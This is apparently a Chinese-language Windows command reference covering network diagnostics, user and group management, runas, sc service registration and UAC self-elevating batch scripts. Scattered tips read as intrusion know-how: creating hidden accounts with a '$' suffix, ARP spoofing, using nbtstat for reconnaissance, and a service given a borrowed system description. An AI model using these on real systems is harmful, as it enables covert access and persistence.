如果参数-t和-n一起使用,ping命令就以在后面的参数为标准,比如"ping IP -t -n 3",虽使用-t参数,但并不一直ping下去,而是只ping 3次

time=2表示从发出数据包到接受到返回数据包所用的时间是2秒,从这里可以判断网络连接速度的大小。

从TTL的返回值可以初步判断被ping主机的操作系统,初步判断是因为这个值是可以修改的。TTL=32表示操作系统可能是win98,如果TTL=128表示目标主机可能是Win2000;如果TTL=250则目标主机可能是Unix

Ping命令判断网络故障
Ping 127.0.0.1,如发现本地循环地址无法Ping通表明本地机TCP/IP协议不能正常工作
ipconfig查看本地的IP地址,然后Ping该IP(192.168.12.114),通则表明网络适配器(网卡或MODEM)工作正常
然后Ping一台同网段计算机的IP,不通则表明网络线路出现故障;若网络中还包含有路由器则应先Ping路由器在本网段端口的IP,不通则此段线路有问题;通则再Ping路由器在目标计算机所在网段的端口IP,不通则是路由出现故障;通则再Ping目的机IP地址。
最后检测一个带DNS服务的网络,在上一步Ping通了目标计算机的IP地址后仍无法连接到该机则可Ping该机的网络名,比如Ping www.toutiao.com,正常情况下会出现该网址所指向的IP,这表明本机的DNS设置正确而且DNS服务器工作正常,反之就可能是其中之一出现了故障;同样也可通过Ping计算机名检测WINS解析的故障(WINS是将计算机名解析到IP地址的服务)
还可以在Ping的地址后面加上-t,这样可不断地进行Ping的连接,可反映出网络的连接是否有中断或丢包的现象

【 netsh命令 】
netsh是一个命令集,它包含了查看、修改、删除IP地址及DNS等多种功能。
在DOS下输入netsh,进入称为netsh的一个子shell中,其中有以下命令:
netsh>? 显示帮助菜单
netsh>ipsec 进入ipsec子菜单,可以对ipsec进行设置

netsh interface ip set address name="本地连接" source=static addr=192.168.1.1 mask=255.255.255.0 gateway=192.168.1.254 gwmetric=1
将本机的网卡设为192.168.1.1,并设置相应的掩码和网关

netsh interface ip set dns name="本地连接" source=static addr=114.114.114.114 register=PRIMARY
设置DNS

netsh interface ip show address
显示设置的结果

netsh interface ip set address name="本地连接" source=dhcp
设置网卡自动获取IP地址,通过DHCP自动获取地址

netsh interface ipv6
设置IPv6的地址信息

NETSH WLAN show drivers
查看是否支持承载网络

NETSH WLAN set hostednetwork mode=allow ssid=Your_SSID key=Your_Passphrase
设置WiFi热点相关信息

NETSH WLAN start hostednetwork
启动已经设置的WiFi热点

NETSH WLAN stop hostednetwork
关闭WiFi热点

NETSH WLAN set hostednetwork ssid=新的热点名称
修改热点的名称

NETSH WLAN set hostednetwork key=新的热点密码
修改热点的密码

【 arp命令 】
显示和修改地址解析协议(ARP)使用的"IP到物理"地址转换表, ip -> mac

ARP是一个重要的TCP/IP协议,并且用于确定对应IP地址的网卡物理地址。ARP命令是黑客和网络管理员都常用的命令,可以通过此命令进行ip地址mac地址的欺骗

ARP -s inet_addr eth_addr [if_addr]
ARP -d inet_addr [if_addr]
ARP -a [inet_addr] [-N if_addr] [-v]

-a          通过询问当前协议数据,显示当前ARP项。指定inet_addr则只显示指定计算机的IP和物理地址。若不止一个网络接口使用ARP则显示每个ARP表的项。
-g          与-a相同。
-v          在详细模式下显示当前ARP项。所有无效项和环回接口上的项都将显示。
inet_addr   指定Internet地址。
-N if_addr  显示if_addr指定的网络接口的ARP项。
-d          删除inet_addr指定的主机。inet_addr可以是通配符*,以删除所有主机。
-s          添加主机且将Internet地址inet_addr与物理地址eth_addr关联。物理地址是用连字符分隔的6个十六进制字节。该项是永久的。
eth_addr    指定物理地址。
if_addr     如果存在,此项指定地址转换表应修改的接口的Internet地址。如果不存在,则使用第一个适用的接口。

示例:
> arp -s 192.168.2.189 0a-1b-23-7c-8e-9f,添加IP地址为:192.168.2.189,MAC地址为:0a-1b-23-7c-8e-9f的静态项
> arp -a   显示ARP表。

pathping  跟踪跃点然后向经过的跃点发送3个ping请求,可以检测DNS劫持
nbtstat  显示协议统计和当前TCP/IP实际网络连接,路由表及每个网络接口设备的状态信息,使用这个命令你可以得到远程主机的NETBIOS信息

【 nbtstat命令 】
该命令使用TCP/IP上的NetBIOS显示协议统计和当前TCP/IP连接,使用这个命令可以得到远程主机的NETBIOS信息,比如用户名、所属的工作组、网卡的MAC地址等　　

-a 使用这个参数,只要知道了远程主机的机器名称就可以得到它的NETBIOS信息(下同)。 　　
-A 这个参数也可以得到远程主机的NETBIOS信息,但需要知道它的IP。
-n 列出本地机器的NETBIOS信息。 　　

当得到了对方的IP或机器名的时候就可以使用nbtstat命令来进一步得到对方的信息了,这又增加了入侵的保险系数

【 netstat命令 】
监控TCP/IP网络,可以显示路由表、实际的网络连接以及每一个网络接口设备的状态信息,功能及其强大
netstat -a 查看本地机器所有开放的端口,可有效发现和预防木马,查看机器所开的服务等信息(FTP服务、Telnet服务、邮件服务、WEB服务)
netstat -t 显示本机外部连接,远程连接,开发端口,连接的状态
netstat -r 查看路由表,显示当前主机的路由表信息,查看本地机器的网关、子网掩码等信息
netstat -an   查看活动的连接
netstat -nao  查看系统80端口占用

【 tracert命令 】
跟踪路由信息,使用此命令可以查出数据从本地机器传输到目标主机所经过的所有途径,可以检测DNS劫持,对了解网络布局和结构很有帮助
跟踪跃点然后向每一个跃点发送100个数据包统计丢包率,然后向最终服务器发送100个数据包统计每个节点丢包率,可了解网络布局和结构
数据从本地机器传输到192.168.0.1的机器上,中间没有经过任何中转,说明这两台机器是在同一段局域网内

tracert www.baidu.com
第一行得到的是内网IP,
第二行就是公网-外网的IP了

tracert -4 www.baidu.com   # 强制使用IPv4追踪提供的网址

【 telnet命令 】
功能强大的远程登录命令,Windows系统telnet命令默认不开启,开启方法控制面板->程序->打开或关闭windows功能->Telnet客户端
操作简单,如同使用自己的机器一样,只要熟悉DOS命令,在成功以administrator身份连接了远程机器后就可以干任何事

首先键入telnet回车,再键入help查看其帮助信息。 　　
然后在提示符下键入open IP回车,这时就出现了登陆窗口,输入合法的用户名和密码,这里输入任何密码都是不显示的。 　　
当输入用户名和密码都正确后就成功建立了telnet连接,这时候就在远程主机上具有了和此用户一样的权限

查看端口是否开放
telnet 127.0.0.1 2347
telnet www.baidu.com

Escape 字符为 'CTRL+]'
打开本地回显功能,即在连接服务器之后切换回本地,单击回车键进入编辑状态

执行完telnet命令后,如果报以下错误：
正在连接10.0.0.9...无法打开到主机的连接。 在端口 3306: 连接失败。

报错的原因有以下几种：
1、本机与10.0.0.9不能正常通信;
2、本机与10.0.0.9的3306端口的连接被其防火墙拦截;
3、10.0.0.9上的3306端口未处于监听状态,即3306对应的服务没有正常启动。

【 schtasks命令 】
AT命令已弃用,请改用schtasks.exe
schtasks命令允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务

SCHTASKS /parameter [arguments]

参数列表:
/Create         创建新计划任务。
/Delete         删除计划任务。
/Query          显示所有计划任务。
/Change         更改计划任务属性。
/Run            按需运行计划任务。
/End            中止当前正在运行的计划任务。
/ShowSid        显示与计划的任务名称相应的安全标识符。
/?              显示此帮助消息。

Examples:
SCHTASKS
SCHTASKS /?
SCHTASKS /Run /?
SCHTASKS /End /?
SCHTASKS /Create /?
SCHTASKS /Delete /?
SCHTASKS /Query  /?
SCHTASKS /Change /?
SCHTASKS /ShowSid /?

【 whoami命令 】
>whoami
laptop-0kmqm01d\lenovo

【 net命令 】
net view        查看远程主机的所有共享资源
net user        添加或更改用户账号或显示用户账号信息
net use         把远程主机的某个共享资源影射为本地盘符,连接计算机或断开计算机与共享资源的连接,或显示计算机的连接信息
net time        使计算机的时钟与另一台计算机或域的时间同步
net start       启动服务,或显示已启动服务的列表
net pause       暂停正在运行的服务
net stop        关闭服务,用法和net start同
net continue    重新激活挂起的服务
net statistics  显示本地工作站或服务器服务的统计记录
net share       创建、删除或显示共享资源
net session     列出或断开本地计算机和与之连接的客户端的会话
net send        向网络的其他用户、计算机或通信名发送消息
net print       显示或控制打印作业及打印队列
net name        添加或删除消息名(有时也称别名),或显示计算机接收消息的名称列表
net localgroup  添加、显示或更改本地组
net group       在Windows NT/2000/2003 Server 域中添加、显示或更改全局组
net file        显示某服务器上所有打开的共享文件名及锁定文件数
net config      显示当前运行的可配置服务,或显示并更改某项服务的设置
net computer    从域数据库中添加或删除计算机
net accounts    更新用户帐号数据库、更改密码及所有帐号的登录要求

【 用户管理 】
可在计算机管理中查看用户和组的信息

net user                                   // 查看所有系统用户的用户名
echo %username%                            // 查看当前登录用户
net user username                          // 查看指定用户信息,在“本地组成员”处即可看到所属的用户组
net user Administrator                     // 查看administrator用户的信息
net user 用户名 密码(可选)/add              // 添加用户
net user 用户名 密码 /add /expires:never    // 账户永不过期
net user 用户名 /del                       // 删除用户
net user 用户名 新密码                     // 修改用户密码,该命令需权限高于要修改的用户名

添加隐藏账户只需在用户名后加$符号即可

如果添加用户时要进一步指定选项,则参照下面的内容:
net user myuser /active:no       禁用myuser用户
net user myuser /active:yes      激活myuser用户
net user myuser /passwordchg:yes 用户myuser可以改变密码
net user myuser /passwordreq:yes 用户myuser必须拥有密码
net user myuser /expires:never   用户myuser永不过期

net user admin_temp admintemp /add /expires:never  // 将用户从Users组中删除
net localgroup 组 用户名 /add                       // 将用户加入到指定的组中
net localgroup administrators tmp /add             // 设置tmp为管理员

administrators组的权限最高,users组的权限受到了一定限制
系统管理员组administrators的成员可以更改其它用户的权限
net localgroup administrators username /add       // 把普通users用户添加到administrators组里

将域用户添加到管理员组/从管理员组删除
net localgroup administrators app5173.com\g_anquan /add
net localgroup administrators app5173.com\g_anquan /delete

net user zhangxb /times:monday-friday,8:00-17:00  // 限制用户登录电脑的天数及时间段

一、 用户帐户管理
1、 用户帐户
不同的用户身份拥有不同的权限
每个用户包含一个名称和一个密码
用户帐户拥有唯一的安全标识符(SID)

2、 用户管理
创建用户、为用户重置密码、重命名用户、启用、禁用用户帐户
删除用户帐户(删除用户后再创建同名同密用户也不具有以前用户的权限,因为SID安全标识符不同)

二、 内置用户帐户
用于特殊用途,一般不需更改其权限
1) Administrator(管理员用户)默认的管理员用户。无法删除此帐户,为了安全建议改名。
2) Guest(来宾用户)默认是禁用的,提供给没有帐户的用户来临时使用,它只拥有有限权限。无法删除。

三、 管理组帐户
1、组账户
组是一些用户的集合
组内的用户自动具备为组所设置的权限

2、组帐户管理
新建组、向组内添加成员(可以双击组添加成员或右击用户—属性—隶属于)、重命名组、删除组

SYSTEM组
这个组拥有和Administrators一样甚至更高的权限,在察看用户组的时候它不会被显示出来,也不允许任何用户的加入。这个组主要是保证了系统服务的正常运行,赋予系统及系统服务的权限。

3、常见内置组的作用:
1) Administrators:此组内用户具有系统管理员权限。
管理员组,默认情况下,Administrators中的用户对计算机/域有不受限制的完全访问权。分配给该组的默认权限允许对整个系统进行完全控制。一般来说,应该把系统管理员或者与其有着同样权限的用户设置为该组的成员

2) Backup Operators:具有备份和还原的权限

3) Guests:如果注销位于此组的成员,其用户配置文件将被删除,默认guest即属于此组。
来宾组,来宾组跟普通组Users的成员有同等访问权,但来宾账户的限制更多

4) Network Configuration Operators:具有管理网络功能的配置,如更改IP地址

5) Power Users:旧版windows系统就已经存在的组,为简化组即将被淘汰。
高级用户组,Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。分配给 Power Users 组的默认权限允许 Power Users 组的成员修改整个计算机的设置。但Power Users 不具有将自己添加到 Administrators 组的权限。在权限设置中,这个组的权限是仅次于Administrators的

6) Remote Desktop Users:此组内的用户可以从远程计算机使用远程桌面服务来登录

7) Users:新用户的默认组
普通用户组,这个组的用户无法进行有意或无意的改动。因此,用户可以运行经过验证的应用程序,但不可以运行大多数旧版应用程序。Users 组是最安全的组,因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料。Users 组提供了一个最安全的程序运行环境。在经过 NTFS 格式化的卷上,默认安全设置旨在禁止该组的成员危及操作系统和已安装程序的完整性。用户不能修改系统注册表设置、操作系统文件或程序文件。Users 可以创建本地组,但只能修改自己创建的本地组。Users 可以关闭工作站,但不能关闭服务器

8) Print Operators:具有管理打印机的权限

4、特殊本地内置组
Everyone:任何一个用户都属于这个组
所有的用户,这个计算机上的所有用户都属于这个组。

Authenticated Users:任何使用有效用户来登录此计算机的用户,都属于此组
Interactive:任何在本地登录(按ctrl+alt+del键登录)的用户,都属于此组
Network:任何通过网络来登录此计算机的用户,都属于此组。
注:本地组不能包含本地组,可以包含某些内置组。

四、ALP规则
将本地用户加入本地组,最后只给本地组分配权限(ALP规则的含义)

五、文件系统概述
1、 文件系统:即在外部存储设备上组织文件的方法
2、常用的文件系统:FAT、NTFS、EXT

【 Win10切换Administrator账户 】
1、在任务栏搜索框或Cortana搜索栏输入CMD,并"以管理员身份运行"
2、在命令提示符中输入如下命令后回车:net user administrator /active:yes
3、此时管理员账户已开启,在开始菜单点击用户头像就可以看到切换选项
4、点击Administrator会切换到登录画面,此时点击登录即可
5、初次进入该账户,同样需要等待应用设置

进入桌面后可以在最高权限下工作,UAC不会开启,但此时Windows应用无法运行。完成必要的工作后请及时注销该账户登录,并且在回到普通账户后再次关闭Administrator账户。具体方法如下:
1、再次以管理员身份运行命令提示符
2、输入以下命令后回车:net user administrator /active:no

【 runas命令  】
以管理员身份运行某个程序,只在得到提示时才输入用户的密码

>runas /?
RUNAS 用法:
RUNAS [ [/noprofile | /profile] [/env] [/savecred | /netonly] ] /user:< UserName > program
RUNAS [ [/noprofile | /profile] [/env] [/savecred] ] /smartcard [/user:< UserName >] program
RUNAS /trustlevel:< TrustLevel > program

/noprofile        指定不应该加载用户的配置文件。这会加速应用程序加载,但可能会造成一些应用程序运行不正常。
/profile          指定应该加载用户的配置文件。这是默认值。/profile 跟 /netonly 不兼容
/env              要使用当前环境,而不是用户的环境。
/netonly          只在指定的凭据限于远程访问的情况下才使用。
/savecred         用用户以前保存的凭据。/savecred 跟 /smartcard 不兼容
/smartcard        如果凭据是智能卡提供的,则使用这个选项。
/user             < UserName > 应使用 USER@DOMAIN 或 DOMAIN\USER 形式
/showtrustlevels  显示可以用作 /trustlevel 的参数的信任级别。
/trustlevel       < Level > 应该是在 /showtrustlevels 中枚举的一个级别。
program           EXE的命令行

示例:
# 使用本机上的Administrator管理员身份执行CMD,/noprofile为不加载该用户的配置信息
> runas /noprofile /user:mymachine\administrator cmd
# 使用本机上的admin身份扫行msc控制台。 /profile为指定加载用户配置文件。 /env 表示使用当前环境
> runas /profile /env /user:mydomain\admin "mmc %windir%\system32\dsa.msc"
# 使用域用户身份运行,并指定使用notepad打开my file.txt文档
> runas /env /user:user@domain.microsoft.com "notepad \"my file.txt\""

runas /user:user_name program.exe
user_name是要使用哪个用户运行该程序,program.exe是程序名,如果program.exe不在system32目录下的话需要指明具体路径。

runas /user:administrator bash
以管理员身份运行bash

runas /user:guest "cmd.exe cmd/k at.exe"
在新cmd中使用guest帐号运行at命令,查看当前的计划任务清单,guest默认是没有此权限,因此只要这个命令起作用会出现"拒绝访问"的字样
cmd.exe是调用cmd这个程序,而cmd/k则是指cmd命令后跟/k参数,目的是为了是当前的执行结果的屏幕保留
这里由于命令过长且中间有空格,所以用引号引起来,如果只有一个命令如at.exe的话就不需要有引号
由于运行的程序是在一个新窗口中打开,而不是在原来的cmd窗口中打开,所以如果不使用cmd.exe cmd/k参数的话窗口会一闪而过,看不到效果

用管理员权限运行程序需要用到runas命令,在使用脚本运行时无法简单的利用管道来输入密码,以下方法可免除每次要输入密码的麻烦
1、使用系统自带的runas /savecred选项,第一次输入密码后会保存凭据,无法限制能够运行的命令,安全性差。

2、使用sanur,这是一个小程序,能以管道的方法将密码或文件中的内容传递给runas程序。特点:密码明文保存
runas | sanur password
runas | sanur /i [drive:][path]filename

3、使用lsrunas,功能类似sanur,不过它无需运行runas,自带完整的参数来执行。特点:密码明文保存。

4、使用lsrunase,lsrunas的加强版本,可以使用加密的密码。自带一个小软件LSencrypt用来生成加密的字串。
lsrunase /user:administrator /password:41BngA== /domain: /command:notepad.exe /runpath:c:
所有的参数必须齐全,其中:
user 为运行的账号
password 为密码加密后的字串
domain 为机器名或域名,也可留空代表本机
command 为要运行的程序名,如果携带参数需要在命令的首尾加引号
runpath 为程序启动的路径
特点:可以较完美的替代runas,并避免直接将密码明文保存在脚本中。

5、使用cpau,这也是一个替代runas的程序,并且功能强大,可以使用加密的密码。
cpau -u administrator -p password -ex notepad -file start_notepad.txt -enc
cpau -file start_notepad.txt -dec
以上命令可以先将要执行的指令加密保存为一个文件,执行时载入此文件。
特点:可以保护执行的脚本及命令不被他人查看,但在使用网络路径时存在一些问题。

6、使用autoit,这是一个脚本自动化执行的工具,可以完成很多自动化的任务,且可将脚本编译成exe文件直接运行,达到隐藏密码信息的目的。
特点:功能强大,但操作复杂

</pre>
</div>

<div id="serverdoscmd">
<h4>管理Windows服务的命令:sc、net</h4><pre>
以管理员身份运行cmd
cmd> services.msc

【 sc命令 】
sc命令显示或配置服务(后台进程)
sc命令可注册windows服务,实现程序后台运行和开机自启
实际就是windows的system32目录下的两个执行程序,因为环境变量Path中有system32目录,所以输入这样的命令cmd会去这个命令中找到相应的执行程序

C:\Users\lenovo>sc /?
描述:SC是用来与服务控制管理器和服务进行通信的命令行程序。
用法:sc server [command] [service name] option1 option2...
server 选项的格式为 "\\ServerName"
可通过键入以下命令获取有关命令的更多帮助: "sc [command]"
命令:
query-----------查询服务的状态或枚举服务类型的状态。
queryex---------查询服务的扩展状态或枚举服务类型的状态。
start-----------启动服务。
pause-----------向服务发送PAUSE控制请求。
interrogate-----向服务发送INTERROGATE控制请求。
continue--------向服务发送CONTINUE控制请求。
stop------------向服务发送STOP请求。
config----------更改服务的配置(永久)。
description-----更改服务的描述。
failure---------更改失败时服务执行的操作。
failureflag-----更改服务的失败操作标志。
sidtype---------更改服务的服务SID类型。
privs-----------更改服务的所需特权。
managedaccount--更改服务以将服务帐户密码标记为由LSA管理。
qc--------------查询服务的配置信息。
qdescription----查询服务的描述。
qfailure--------查询失败时服务执行的操作。
qfailureflag----查询服务的失败操作标志。
qsidtype--------查询服务的服务SID类型。
qprivs----------查询服务的所需特权。
qtriggerinfo----查询服务的触发器参数。
qpreferrednode--查询服务的首选NUMA节点。
qmanagedaccount-查询服务是否将帐户与LSA管理的密码结合使用。
qprotection-----查询服务的进程保护级别。
quserservice----查询用户服务模板的本地实例。
delete ---------(从注册表中)删除服务。
create----------创建服务(并将其添加到注册表中)。
control---------向服务发送控制。
sdshow----------显示服务的安全描述符。
sdset-----------设置服务的安全描述符。
showsid---------显示与任意名称对应的服务SID字符串。
triggerinfo-----配置服务的触发器参数。
preferrednode---设置服务的首选NUMA节点。
GetDisplayName--获取服务的DisplayName。
GetKeyName------获取服务的ServiceKeyName。
EnumDepend------枚举服务依赖关系。

以下命令不需要服务名称:
sc server command option
boot------------(ok | bad)指示是否应将上一次启动另存为最近一次已知的正确启动配置
Lock------------锁定服务数据库
QueryLock-------查询SCManager数据库的LockStatus

QUERY和QUERYEX选项:
如果查询命令带服务名称将返回该服务的状态。其他选项不适合这种情况。如果查询命令不带参数或带下列选项之一,将枚举此服务。
type=    要枚举的服务的类型(driver, service, userservice, all),默认service
state=   要枚举的服务的状态(inactive, all),默认active
bufsize= 枚举缓冲区的大小(以字节计),默认4096
ri=      开始枚举的恢复索引号,默认0
group=   要枚举的服务组,默认all groups

sc命令语法
sc [servername] command servicename [optionname= optionvalues]
所有optionname等号后面都必须要有空格
servername: 可以使用斜线如\youserver或\192.168.1.124来操作远程计算机,本地计算机上操作就不用添加任何参数
command:config(改变服务的配置),create(创建服务增加到注册表中),start(启动服务),stop(停止服务),delete(删除服务)
servicename:给注册的服务命的名
optionname:binpath(服务二进制文件的路径名必须设置),其他参数省略

sc query                              - 列举出所有的Windows服务及其详细信息
sc query eventlog                     - 显示eventlog服务的状态
sc queryex eventlog                   - 显示eventlog服务的扩展状态
sc query type= driver                 - 仅枚举活动驱动程序
sc query type= service                - 仅枚举Win32服务
sc query state= all                   - 枚举所有服务和驱动程序
sc query bufsize= 50                  - 枚举缓冲区为50字节
sc query ri= 14                       - 枚举时恢复索引 = 14
sc queryex group= ""                  - 枚举不在组内的活动服务
sc query type= interact               - 枚举所有不活动服务
sc query type= driver group= NDIS     - 枚举所有NDIS驱动程序
sc query | findstr -RI ".*mysql.*"    - 列出所有运行状态的服务和驱动程序
sc query state=all | findstr -RI ".*mysql.*"      - 列出所有服务和驱动程序

【 sc命令创建Windows服务 】
sc create servicename binpath= "&&&"(注册服务)
不是所有的exe都可以注册成服务,不符合规范的可以注册成功但启动会失败
binpath的等号右边需要留一个空格,这个属于规范,必须要这样做,否则会导致失败
如果路径中存在空格或包含了特殊字符则需要增加转义符

sc create myserver binpath= c:\windows\Sc\myserver.exe
sc config myserver start= auto
sc description myserver "利用空闲的网络带宽在后台传输文件。"  # 修改服务描述
sc start myserver

sc create lingyijiang binpath= C:\tmp\lingyijiang.exe type= share start= auto displayname= "lingyijiang"
sc create services binpath= "D:\Code\C++\Services\Release\Services.exe" type= own start= demand displayname= "service test" depend= iisadmin/Schedule
sc create BITS binpath= "C:\WINDOWS\system32\svchost.exe -k netsvcs" type= share start= auto displayname= "Background Intelligent Transfer Service" depend= RpcSs/EventSystem

# 注册redis服务,需要加入参数"--service-run"
SC CREATE redis6379 binpath= "\"C:\redis64-3.0.501\63 79\redis-server.exe\" --service-run \"C:\redis64-3.0.501\63 79\redis.windows.conf\""
# 启动redis命令
SC start redis6379

【 启动/停止/删除Windows服务 】
如果操作服务时系统拒绝则需要管理员权限,可以管理员身份运行该命令,启动Windows服务可以通过sc和net两种命令
sc start iisadmin
net start iisadmin

sc stop iisadmin
net stop iisadmin

sc delete iisadmin

sc enumdepend iisadmin  # 枚举Windows服务的依存关系

【 mysql注册为windows本地系统服务 】
1)将MySQL添加到服务中
以管理员模式启动cmd,进入mysql安装路径,如果一台机器上要安装多台mysql,一定要指定mysql的配置文件的路径,否则同时只能启动1台mysql
mysqld install mysql --defaults-file=G:\mysql-5.6.32-winx64\my-default.ini
命令行中输入services.msc回车,可以看到MySQL已被添加到Services中,Path to executable中的内容为
d:\appspace\mysql\bin\mysqld --defaults-file=G:\mysql-5.6.32-winx64\my-default.ini MySQL

2)启动MySQL,如果出现1067错误启动不了则重新检查my.ini文件
net start mysql

3)关闭MySQL
net stop mysql

4)删除mysql服务
mysqld –remove

【 将apache注册为windows服务 】
Apache的bin目录下执行httpd.exe -k install可把Apache注册到Windows的系统服务中。
httpd.exe -k uninstall可从注册表中把apache的服务删除掉。
在操作完成之后可以按win+r然后运行services.msc打开服务,查看列表中是否已经有apache服务。

【 通过redis的自带工具安装windows本地服务 】
进入redis安装目录
注册服务 redis-server --service-install
安装服务 redis-server --service-install redis.windows.conf --service-name redis6379 --loglevel verbose
删除服务 redis-server --service-uninstall
开启服务 redis-server --service-start
启动服务 redis-server --service-start --service-name redis6379
停止服务 redis-server --service-stop
停止服务 redis-server --service-stop --service-name redis6379

</pre>
</div>

<div id="bat">
<h2>bat批处理脚本文件 BATCH</h2><pre>
批处理文件是将一系列命令按一定的顺序集合为一个可执行的文本文件,其扩展名为BAT或CMD,这些命令统称批处理命令。
Ctrl+C可以强行终止一个批处理的执行过程

将批处理文件拖入CMD窗口,此时文件的路径会出现在屏幕上,然后按回车即可

@echo off
echo '欢迎来到非常BAT!'
pause
把上面的3条命令保存为文件test.bat或test.cmd然后执行,输出:
'欢迎来到非常BAT!'
Press any key to continue . . .

bat脚本中以管理员权限执行命令
在bat脚本文件第一行加上下面命令：
%1 mshta vbscript:CreateObject(“Shell.Application”).ShellExecute(“cmd.exe”,"/c %~s0 ::","",“runas”,1)(window.close)&&exit

在要执行的bat文件中的最上方添加下面命令
%1 %2
ver|find "5.">nul&&goto :st
mshta vbscript:createobject("shell.application").shellexecute("%~s0","goto :st","","runas",1)(window.close)&goto :eof
:st
copy "%~0" "%windir%\system32\"

脚本内容
@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B
:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"
goto run
:run
cls
cmd
::从凤凰系统启动bat里看到的

脚本内容,最下面接批处理
@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B
:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"

改进,最好先将当前目录切换到bat所在文件夹里
@echo off
cd /d "%~dp0"
cacls.exe "%SystemDrive%\System Volume Information" >nul 2>nul
if %errorlevel%==0 goto Admin
if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"
echo Set RequestUAC = CreateObject^("Shell.Application"^)>"%temp%\getadmin.vbs"
echo RequestUAC.ShellExecute "%~s0","","","runas",1 >>"%temp%\getadmin.vbs"
echo WScript.Quit >>"%temp%\getadmin.vbs"
"%temp%\getadmin.vbs" /f
if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"
exit

:Admin

:Admin后换行跟自己的批处理
根据实际情况修改“RequestUAC”“%temp%\getadmin.vbs”这两个字段

补充
一是对于生成的vbs要做清理
二是要让Wscript执行WScript.Quit来结束进程,不然进程里会一直有脚本解释器在运行
另外,是关于操作系统的版本这个问题：
考虑了在低于Vista/2008的情况下,关于UAC的问题。UAC并不存在于XP里,当然也考虑了把批处理放在低于Vista/2008操作系统里运行的情况：若是在管理员账户(包括超级管理员)下运行,那就不需要前面这个判断UAC的了;若是在受限账户下运行,要拿权限,我猜就需要Hack点的手段了吧,不是很懂。所以如果需要判断操作系统的,那就把这段放最前面：
@echo off
ver|findstr "[6,10]\.[0-9]\.[0-9][0-9]*" > nul && (goto Main)
ver|findstr "[3-5]\.[0-9]\.[0-9][0-9]*" > nul && (goto isBelowNT6)

:isBelowNT6

:Main

脚本内容
@echo off
title 获取管理员权限
mode con cols=100 lines=20
color 3f

:: 开始获取管理员权限
setlocal
set uac=~uac_permission_tmp_%random%
md "%SystemRoot%\system32\%uac%" 2>nul
if %errorlevel%==0 ( rd "%SystemRoot%\system32\%uac%" >nul 2>nul ) else (
    echo set uac = CreateObject^("Shell.Application"^)>"%temp%\%uac%.vbs"
    echo uac.ShellExecute "%~s0","","","runas",1 >>"%temp%\%uac%.vbs"
    echo WScript.Quit >>"%temp%\%uac%.vbs"
    "%temp%\%uac%.vbs" /f
    del /f /q "%temp%\%uac%.vbs" & exit )
endlocal
:: 完成获取,下面可以开始写你自己的代码了

echo.
echo 原理：先尝试在系统目录下临时新建一个文件夹,若已获取管理员权限或是运行在XP等不需要管理员权限的
echo       老系统时,是可以新建成功的,此时只需删除这个临时新建的文件夹就好了,否则通过创建一个临时
echo       vbs脚本获取管理员权限,然后再删除这个临时vbs脚本文件。
echo.
echo 提示：当获取管理员目录后,你的批处理运行目录会发生变化,为保证目录准确,
echo       可通过 cd 切换目录,例“cd /d %%~dp0”切换回批处理所在目录
echo.
echo 当前运行目录： %cd%\
echo 批处理所在目录：%~dp0
echo.
echo 例：切换回批处理所在目录
echo cd /d %%~dp0
echo.

cd /d %~dp0

echo 当前运行目录： %cd%\
echo 批处理所在目录：%~dp0

pause
exit

</pre>
</div>

<div id="fuhao">
<h3>常用特殊符号</h3><pre>
@ 命令行回显屏蔽符
% 批处理变量引导符
> 重定向符
>> 重定向符
<、>&、<& 重定向符
| 命令管道符
^ 转义字符
& 组合命令
&& 组合命令
|| 组合命令
'' 字符串界定符
, 逗号
; 分号
() 括号
! 感叹号

CR(0D) 命令行结束符
Escape(1B) ANSI转义字符引导符
Space(20) 常用的参数界定符
Tab(09) ; = 不常用的参数界定符
+ COPY命令文件连接符
* ? 文件通配符
/ 参数开关引导符
: 批处理标签引导符

</pre>

<h4>@ 命令行回显屏蔽符</h4><pre>
@字符在批处理中表示关闭当前行的回显,回显就是显示正在执行的每条批处理命令及执行的结果等
执行批处理文件时如果没有@echo off,将会逐条显示文件的内容和处理的结果
ECHO OFF可以关闭掉整个批处理命令的回显,但不能关掉ECHO OFF这个命令,在ECHO OFF这个命令前加个@就可以达到所有命令均不回显的要求

</pre>

<h4>^ 转义字符</h4><pre>
不成对的引号要加转义字符^
echo ^'1111>temp.txt
echo '2222'>>temp.txt
echo 3333^'>>temp.txt
echo '4444'44>>temp.txt
echo ^'55'55'55>>temp.txt

^是对特殊符号<,>,&的前导字符,在命令中将以上3个符号的特殊功能去掉,仅仅只把他们当成符号而不使用其的特殊意义
echo test ^>1.txt
输出:test > 1.txt

此转义字符还可以用作续行符号,因为每行末尾还有一个看不见的符号即回车符,转义字符位于行尾时就让回车符失效了,从而起到了续行的作用。
@echo off
echo 英雄^
是^
好^
男人
pause
输出:英雄是好男人

</pre>

<h4>% 批处理变量引导符</h4><pre>
%百分号严格来说是算不上命令的,只是批处理中的参数而已,多个%一起使用的情况除外
引用变量用%var%,调用程序外部参数用%1至%9等等
%0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*为命令行传递给批处理的参数
%0 批处理文件本身,包括完整的路径和扩展名,如"C:\Users\lenovo\Desktop\test.cmd"
%1 第一个参数
%9 第九个参数
%* 从第一个参数开始的所有参数

